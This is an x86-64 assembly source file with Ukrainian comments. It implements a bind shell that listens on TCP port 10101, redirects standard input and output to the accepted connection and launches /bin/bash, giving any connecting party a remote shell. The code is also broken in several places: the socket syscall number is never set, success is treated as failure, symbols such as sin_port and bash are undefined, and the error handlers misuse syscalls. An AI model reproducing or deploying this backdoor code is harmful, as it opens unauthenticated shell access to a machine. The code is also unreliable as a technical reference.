/* .data section */
.data

sock: .long 0
fd: .long 0

/* .bss section */
.bss

sin: .long 0, 0, 0

/* .text section */
.text

.globl main

main:
    /* Створення TCP-сокета */
    mov $AF_INET, %eax
    mov $SOCK_STREAM, %ebx
    mov $IPPROTO_TCP, %ecx
    syscall

    /* Перевірка результату */
    mov %eax, sock

    test %eax, %eax
    jne .error_socket

    /* Заповнення структури sockaddr_in */
    movw $AF_INET, sin_family

    /* htons(10101) */
    movw $10101, %ax
    xchgb %ah, %al
    movw %ax, sin_port

    /* Прив'язка сокета до адреси */
    mov $SYS_BIND, %rax
    movq sock, %rdi
    movq $sin, %rsi
    movq $0x10, %rdx
    syscall

    /* Перевірка результату */
    mov %eax, sock

    test %eax, %eax
    jne .error_bind

    /* Прослуховування сокета */
    mov $SYS_LISTEN, %rax
    movq sock, %rdi
    mov $1, %rdx
    syscall

    /* Перевірка результату */
    mov %eax, sock

    test %eax, %eax
    jne .error_listen

    /* Прийняття з'єднання */
    mov $SYS_ACCEPT, %rax
    movq sock, %rdi
    mov $0, %rsi
    mov $0, %rdx
    syscall

    /* Перевірка результату */
    mov %eax, fd

    test %eax, %eax
    jne .error_accept

    /* Дублювання дескрипторів файлів */
    mov $SYS_DUP2, %rax
    movq fd, %rdi
    mov $0, %rsi
    syscall

    mov $SYS_DUP2, %rax
    movq fd, %rdi
    mov $1, %rsi
    syscall

    mov $SYS_DUP2, %rax
    movq fd, %rdi
    mov $2, %rsi
    syscall

    /* Запуск /bin/bash */
    mov $SYS_EXECVE, %rax
    mov $bash, %rdi
    mov $0, %rsi
    mov $0, %rdx
    syscall

.error_socket:
    mov $1, %eax
    mov $str_error_socket, %edi
    syscall

    jmp .exit

.error_bind:
    mov $1, %eax
    mov $str_error_bind, %edi
    syscall

    jmp .exit

.error_listen:
    mov $1, %eax
    mov $str_error_listen, %edi
    syscall

    jmp .exit

.error_accept:
    mov $1, %eax
    mov $str_error_accept, %edi
    syscall

    jmp .exit

.exit:
    mov $SYS_EXIT, %rax
    mov $0, %rdi
    syscall

/* Рядки помилок */
.data

str_error_socket: .string "Помилка створення сокета\n"
str_error_bind: .string "Помилка прив'язки сокета\n"
str_error_listen: .string "Помилка при прослуховуванні сокета\n"
str_error_accept: .string "Помилка прийняття з'єднання\n"
